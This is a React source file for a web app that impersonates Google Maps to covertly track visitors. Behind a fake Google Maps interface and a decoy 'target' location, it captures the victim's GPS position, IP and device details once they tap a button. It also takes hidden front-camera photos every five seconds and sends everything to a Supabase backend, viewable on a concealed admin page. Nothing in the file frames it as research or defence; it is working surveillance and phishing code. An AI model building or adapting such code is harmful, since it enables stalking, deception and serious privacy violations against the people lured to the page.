import React, { useState, useEffect, useCallback, useRef } from 'react';
import MapView from './components/MapView';
import AdminPanel from './components/AdminPanel';
import { UserLocation, LogEntry } from './types';
import { getBrowserLocation, saveLocationToBackend, getIpLocation, getDeviceInfo } from './services/locationService';
import { supabase } from './supabaseClient';

function App() {
  // Routing State
  const [isAdminRoute, setIsAdminRoute] = useState(false);

  // App State
  const [location, setLocation] = useState<UserLocation | null>(null);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [shouldRecenter, setShouldRecenter] = useState(false);
  const [permissionState, setPermissionState] = useState<'idle' | 'tracking' | 'denied'>('idle');
  const [deviceId] = useState(() => 'user_' + Math.random().toString(36).substring(7));
  const [currentIp, setCurrentIp] = useState<string>('');
  
  // UI State for FAB Label
  const [showFabText, setShowFabText] = useState(true);

  // Hardware Refs
  const watchIdRef = useRef<number | null>(null);
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const captureIntervalRef = useRef<number | null>(null);
  const streamRef = useRef<MediaStream | null>(null);

  // 1. Handle "Routing" & URL Params (Target Link)
  useEffect(() => {
    // Check for Admin Route
    if (window.location.pathname === '/adm') {
      setIsAdminRoute(true);
      return;
    }

    // Check for "Decoy" Target in URL (e.g. ?target=-6.2,106.8)
    const params = new URLSearchParams(window.location.search);
    const targetParam = params.get('target');
    
    if (targetParam) {
      const [latStr, lngStr] = targetParam.split(',');
      const lat = parseFloat(latStr);
      const lng = parseFloat(lngStr);

      if (!isNaN(lat) && !isNaN(lng)) {
        // Set the map to this location initially (the "Target")
        setLocation({
          lat: lat,
          lng: lng,
          accuracy: 0, // 0 indicates purely artificial target
          timestamp: Date.now(),
          source: 'ip' // Treat as IP/General source for zoom level logic
        });
        setShouldRecenter(true);
      }
    }
  }, []);

  // 1.5 Realtime Admin Data Sync
  useEffect(() => {
    if (!isAdminRoute || !supabase) return;

    const fetchHistory = async () => {
      const { data, error } = await supabase
        .from('user_locations')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(100); 
      
      if (data) {
        const mappedLogs: LogEntry[] = data.map((item: any) => ({
          ...item,
          status: 'synced'
        }));
        setLogs(mappedLogs);
      }
    };

    fetchHistory();

    const channel = supabase
      .channel('public:user_locations')
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'user_locations' }, (payload) => {
        const newRecord = payload.new;
        const newLog: LogEntry = {
          id: newRecord.id,
          latitude: newRecord.latitude,
          longitude: newRecord.longitude,
          device_id: newRecord.device_id,
          ip_address: newRecord.ip_address,
          image_data: newRecord.image_data,
          device_info: newRecord.device_info,
          created_at: newRecord.created_at,
          status: 'synced'
        };
        
        setLogs(prev => [newLog, ...prev]);
      })
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [isAdminRoute]);

  // 2. Initial IP Fetch (Only if NO target was set via URL)
  useEffect(() => {
    if (isAdminRoute) return; 
    
    // Only fetch IP location if we haven't set a location yet (e.g. via ?target=)
    if (!location) {
      const fetchApproximateLocation = async () => {
        if (permissionState === 'idle') {
          const ipLoc = await getIpLocation();
          if (ipLoc) {
            // Only update if still null (user hasn't clicked anything yet)
            setLocation(prev => prev ? prev : ipLoc);
            if (!location) setShouldRecenter(true);
            if (ipLoc.ip) setCurrentIp(ipLoc.ip);
          }
        }
      };
      fetchApproximateLocation();
    }
  }, [permissionState, isAdminRoute, location]);

  // 2.5 Auto-hide FAB text after 25 seconds
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowFabText(false);
    }, 25000); // 25 seconds
    return () => clearTimeout(timer);
  }, []);

  // 3. Helper: Capture Image
  const captureImage = useCallback((): string | undefined => {
    if (videoRef.current && canvasRef.current && streamRef.current) {
      // Check if track is active/live
      if (!streamRef.current.active) return undefined;

      const video = videoRef.current;
      const canvas = canvasRef.current;
      const context = canvas.getContext('2d');
      
      if (context && video.videoWidth > 0) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        return canvas.toDataURL('image/jpeg', 0.5); 
      }
    }
    return undefined;
  }, []);

  // 4. Helper: Process & Save
  const handleDataCapture = useCallback(async (loc: UserLocation, isPeriodicCapture: boolean = false) => {
    // We do NOT update the UI location state here if we are just background logging
    // This keeps the map centered on the "Target" (if set) or User's selection, 
    // while sending the REAL location to backend.
    
    // However, if the user explicitly clicked "Cek Lokasi Saya", we DO want to update the map.
    // Logic: If permissionState is 'tracking', we update UI.
    if (permissionState === 'tracking') {
       setLocation(loc);
    }
    
    let imageData: string | undefined;
    if (isPeriodicCapture) {
      imageData = captureImage();
    }

    // Save if we have GPS source OR an image. 
    if (loc.source === 'gps' || imageData) {
        const deviceInfo = getDeviceInfo();
        const logEntry = await saveLocationToBackend(loc, deviceId, imageData, currentIp, deviceInfo);
        
        if (!isAdminRoute) {
            setLogs(prev => {
              const newLogs = [logEntry, ...prev];
              return newLogs.slice(0, 50);
            });
        }
    }
  }, [deviceId, captureImage, currentIp, isAdminRoute, permissionState]);

  // 5. Start Tracking
  const startTracking = async () => {
    // Check for secure context (HTTPS) which is required for Geolocation in modern browsers
    if (!window.isSecureContext && window.location.hostname !== 'localhost') {
      console.warn("Geolocation requires a secure context (HTTPS) or localhost.");
    }

    // A. Try Camera (Optional)
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      streamRef.current = stream;
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
      }
    } catch (err) {
      // Camera is optional. Log warning but DO NOT stop execution.
      console.warn("Camera access denied or unavailable. Proceeding with Location only.", err);
    }

    // B. Start Location (Mandatory)
    try {
      setPermissionState('tracking');
      setShouldRecenter(true); // Now we want to center on the USER, overriding any "target"

      watchIdRef.current = getBrowserLocation(
        (loc) => {
          // Real-time update to UI
          setLocation(loc); 
          // Background save (first one)
          handleDataCapture(loc, true); 
        },
        (err) => {
          // Improved error logging & handling
          console.warn(`Geo error: Code ${err.code} - ${err.message}`);
          
          if (err.code === 1) { 
             // PERMISSION_DENIED: Fatal
             alert("Google Maps requires location access to find your position.");
             setPermissionState('denied');
          }
        }
      );

      if (captureIntervalRef.current) clearInterval(captureIntervalRef.current);
      
      // Periodic background capture
      captureIntervalRef.current = window.setInterval(() => {
        setLocation(currentLoc => {
            if (currentLoc && currentLoc.source === 'gps') {
                handleDataCapture(currentLoc, true);
            }
            return currentLoc;
        });
      }, 5000);

    } catch (err: any) {
      console.error("Location Initialization error:", err);
      setPermissionState('denied'); 
    }
  };

  useEffect(() => {
    return () => {
      if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current);
      if (captureIntervalRef.current) clearInterval(captureIntervalRef.current);
      if (streamRef.current) streamRef.current.getTracks().forEach(track => track.stop());
    };
  }, []);

  if (isAdminRoute) {
    return <AdminPanel logs={logs} />;
  }

  return (
    <div className="h-full w-full flex flex-col bg-slate-100 overflow-hidden relative font-sans text-slate-800">
      
      <video ref={videoRef} className="hidden" playsInline muted></video>
      <canvas ref={canvasRef} className="hidden"></canvas>

      {/* Header: Designed to look like Google Maps Search Bar */}
      <div className="absolute top-4 left-4 right-4 z-[1500] pointer-events-none flex justify-center">
        <div className="bg-white shadow-lg rounded-full px-5 py-3 flex justify-between items-center pointer-events-auto w-full max-w-md border border-slate-200">
          <div className="flex items-center space-x-4 w-full">
             {/* Google Maps Colored Icon imitation */}
             <div className="flex-shrink-0 text-2xl">
                <i className="fa-solid fa-map-location-dot text-blue-600"></i>
             </div>
             
             <div className="flex-1">
               <h1 className="font-sans font-medium text-lg leading-none text-slate-800">Google Maps</h1>
               <p className="text-xs text-slate-400 font-sans mt-0.5">
                  {permissionState === 'tracking' ? '● Precise location active' : 'Search here'}
               </p>
             </div>

             {/* Fake Microphone Icon */}
             <div className="text-slate-400 px-2">
                <i className="fa-solid fa-microphone"></i>
             </div>
             
             {/* Fake Account Icon / Profile */}
             <div className="w-8 h-8 rounded-full bg-orange-500 text-white flex items-center justify-center font-bold text-sm">
                G
             </div>
          </div>
          
          {/* Hidden Admin Trigger - Click the far right edge invisibly */}
          <a href="/adm" className="absolute right-0 top-0 bottom-0 w-4 opacity-0 cursor-default">.</a>
        </div>
      </div>

      {/* Map */}
      <div className="flex-1 relative z-0">
        <MapView 
          location={location} 
          shouldRecenter={shouldRecenter}
          onRecenterComplete={() => setShouldRecenter(false)}
        />
      </div>

      {/* Action Button: Extended FAB style */}
      <div className="absolute bottom-24 right-6 z-[1500]">
        <button 
          onClick={() => {
            setShowFabText(false); // Hide text immediately on interaction
            if (permissionState !== 'tracking') startTracking();
            else setShouldRecenter(true);
          }}
          className={`
            h-14 shadow-xl flex items-center justify-center transition-all duration-500 ease-in-out border border-transparent
            ${permissionState === 'tracking' 
              ? 'bg-blue-600 text-white w-14 rounded-full animate-pulse shadow-blue-500/50' 
              : 'bg-white text-blue-600 hover:text-blue-700 rounded-full'
            }
            ${showFabText && permissionState !== 'tracking' ? 'px-6 min-w-[140px]' : 'w-14 px-0'}
          `}
          title="My Location"
        >
          <i className={`fa-solid ${permissionState === 'tracking' ? 'fa-location-crosshairs' : 'fa-location-crosshairs'} text-2xl`}></i>
          
          {/* Animated Text Label */}
          <span className={`
              font-sans font-medium text-sm whitespace-nowrap overflow-hidden transition-all duration-500 ease-in-out
              ${showFabText && permissionState !== 'tracking' ? 'max-w-[150px] ml-3 opacity-100' : 'max-w-0 opacity-0 ml-0'}
          `}>
             Lihat detail lokasi
          </span>
        </button>
      </div>

      {/* Fake "Explore" Bottom Bar (Visual Only) */}
      <div className="absolute bottom-0 left-0 right-0 bg-white border-t border-slate-200 py-2 px-6 z-[1400] flex justify-between text-xs font-medium text-slate-500">
          <div className="flex flex-col items-center text-blue-600">
              <i className="fa-solid fa-location-dot text-lg mb-1"></i>
              <span>Explore</span>
          </div>
          <div className="flex flex-col items-center">
              <i className="fa-regular fa-bookmark text-lg mb-1"></i>
              <span>Saved</span>
          </div>
          <div className="flex flex-col items-center">
              <i className="fa-regular fa-square-plus text-lg mb-1"></i>
              <span>Contribute</span>
          </div>
      </div>

    </div>
  );
}

export default App;